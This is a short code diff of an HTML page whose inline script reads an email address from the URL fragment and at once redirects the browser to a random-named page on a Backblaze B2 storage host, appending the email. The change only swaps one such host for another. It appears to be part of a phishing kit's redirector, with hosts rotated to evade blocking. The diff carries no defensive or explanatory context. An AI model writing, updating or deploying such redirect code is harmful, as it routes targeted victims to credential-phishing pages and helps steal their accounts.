@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://bourgeoisify-choledoch-nihilism.s3.eu-central-003.backblazeb2.com/index.html"+ makeid(10) + "#" + em;
+			window.location.href = "https://cathismata-ketchcraft-scaphoceritic.s3.eu-central-003.backblazeb2.com/index.html"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
